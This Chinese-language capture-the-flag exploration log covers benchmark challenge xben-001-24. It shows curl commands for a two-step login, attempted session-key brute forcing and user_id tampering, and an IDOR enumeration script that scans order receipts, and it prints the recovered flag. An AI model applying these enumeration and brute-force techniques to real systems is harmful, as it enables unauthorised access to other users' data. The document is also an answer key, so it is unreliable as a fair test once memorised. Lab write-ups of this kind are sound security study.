# xben-001-24 · 探索记录

对应题解：[`xben-001-24.md`](./xben-001-24.md)

## 目标与起点

容器 `10.0.173.136:80`，`Apache/2.4.67 (Debian)`，应用是 Flask（404 页为 Werkzeug 样式）。
题面无 description，所以从首页源码开始。

首页第一行注释：

```html
<!-- TODO: Delete the testing account (test:test). -->
```

`GET /` 只有一个 `username` 输入框，**没有密码框**。这一点决定了后面的两步登录结构。

## 第一阶段：两步登录

```bash
curl -i -X POST -d 'username=test' http://$T/
# 302 Location: /password/test
```

`GET /password/test`：

```html
<p>Welcome, John!</p>
<form method="POST">
  <input name="username" value="test"  hidden>
  <input name="user_id"  value="10032" hidden>
  <input name="password" type="password" required>
</form>
```

第二步提交 `test` / `10032` / `test`：

```bash
curl -i -X POST -d 'username=test&user_id=10032&password=test' http://$T/password/test
# 302 Location: /dashboard?username=test
# Set-Cookie: session=eyJ1c2VyX2lkIjoxMDAzMn0...
```

session 解出来是 `{"user_id":10032}`，itsdangerous 签名。

## 第二阶段：地形与卡点

登录后可访问的页面只有：

| 路径 | 结果 |
| --- | --- |
| `/dashboard?username=test` | 200，`Welcome, John Doe`，无 flag |
| `/orders` | 200，4 行订单表格 |
| 其它 `/profile` `/settings` `/user` `/account` `/admin` … | 全 404 |

`/dashboard` 里没有任何数据，`/orders` 的 4 行也都正常。**第一轮到这里是断的**：
列表里没有 flag，也没有明显的编辑点。

顺手做了两个"标准动作"，都失败：

| 尝试 | 结果 | 判据 |
| --- | --- | --- |
| 把第二步的 `user_id` 改成 `1` | 仍然是 `user_id=10032` 的会话 | 服务端以 `username` 认证，`user_id` 只是展示字段 |
| 用 10 万条字典爆破 Flask `session` 签名密钥 | 未命中 | `itsdangerous` 的 `key_derivation='cookie-session'` 已按此实现；说明密钥不在常见字典里 |

## 第三阶段：转机 —— 读 `/orders` 的尾部 JS

`/orders` 的表格每一行都有：

```html
<a href="#" class="receipt-link" data-order-id="300123">Receipt</a>
```

`href` 是 `#`，所以点击行为由脚本决定。页面末尾：

```javascript
$('.receipt-link').click(function (event) {
    var orderId = $(this).data('order-id');
    $.ajax({ url: '/order/' + orderId + '/receipt', method: 'GET', ... });
});
```

**接口 `/order/{id}/receipt` 是页面上明写的。** 在此之前盲猜过一批路径，全 404：

| 猜测 | 结果 |
| --- | --- |
| `/receipt/300123` | 404 |
| `/orders/300123` | 404 |
| `/order/300123` | 404 |
| `/receipts/300123` | 404 |
| `/static/js/main.js`、`/static/js/app.js` | 404（脚本是内联的，没有外链业务 JS） |

这就是"内联 JS 比目录爆破快"的实例：正确路径的形态是 `/order/<id>/receipt`，
盲猜很难命中这个组合。

## 第四阶段：IDOR 确认

先验证接口本身和越权边界：

```bash
curl -b cj http://$T/order/300123/receipt   # 200，自己的回执
curl -b cj http://$T/order/300124/receipt   # 200 —— 不在列表里，也能读
```

`300124` 不在 `/orders` 的 4 个 ID（300123 / 300214 / 300327 / 300481）中，
却返回了完整回执，说明**没有归属校验**。

## 第五阶段：枚举

```python
# 30 并发，扫 300000-301000
for i in range(300000, 301000):
    GET /order/%d/receipt  ->  含 'flag{' 就命中
```

命中 `300998`：

```text
Order ID: 300998
flag{e0e0f7fd-1f5d-4bb7-b4cb-006d2e949786}
```

提交：`correct: true, awarded: 300`。

## 走不通 / 走过的弯路（留档）

| 方向 | 结果 | 判据 |
| --- | --- | --- |
| 第二步篡改 `user_id=1` | 无效 | 返回的 session 仍是 `{"user_id":10032}` |
| 爆破 Flask session 密钥（10 万条） | 未命中 | 按 `itsdangerous` + `cookie-session` 派生实现的校验脚本，sig 不匹配 |
| 盲猜回执路径（`/receipt/{id}`、`/orders/{id}`、`/order/{id}`、`/receipts/{id}`） | 全 404 | 真实形态是 `/order/<id>/receipt`，只能从内联 JS 得到 |
| 找外链业务 JS（`/static/js/main.js` 等） | 404 | 业务脚本全部内联在 `/orders` 页面里 |
| `/dashboard?username=admin` | 无变化 | 页面只用会话里的身份，`username` 参数被忽略 |
| 只扫 `/orders` 里出现的 4 个 ID | 全是 Lorem ipsum | flag 在列表外的订单上 |

## 本次实例（xben-001-24）与同批变体的差异

同一批题里 `xben-002-24`、`xben-003-24` 是同一个 Trading Platform 的不同变体，
但**回执接口的行为不一样**，不能直接套用：

| 编号 | 回执接口表现 |
| --- | --- |
| `xben-001-24` | 任意存在的 ID 都返回 200，无归属校验 → 扫 ID 即可 |
| `xben-002-24` | `id=1`、`999999999999` 返回 `401`/400 段文案，`id='`、`abc` 返回 404；文案是 `The order does not exist, or you are not the creator nor the archiver`（**提示存在 archiver 角色**） |
| `xben-003-24` | 登录后完全没有 `/orders`（404），`/dashboard` 存在但没有列表入口 |

这条差异是后面两题卡住的原因，详见各自探索记录。

## 这次真正的收获

1. **首页注释里的测试账号直接可用**，`TODO` 注释在本库是常见线索位。
2. **两步登录的第一步就能拿到 `user_id`**，等于免费获得 ID 空间；
   但**隐藏字段可改不代表生效**，判据是服务端返回的会话内容。
3. **内联 JS 是接口清单。** 盲猜 4 个路径全 404，读 3 行脚本就拿到了正确形态。
4. **IDOR 要扫"列表外的 ID"**。自己的记录通常干干净净，flag 往往在别人的数据里。
5. **同批变体不能照搬结论。** 三题的界面几乎一样，但回执接口的鉴权实现完全不同。
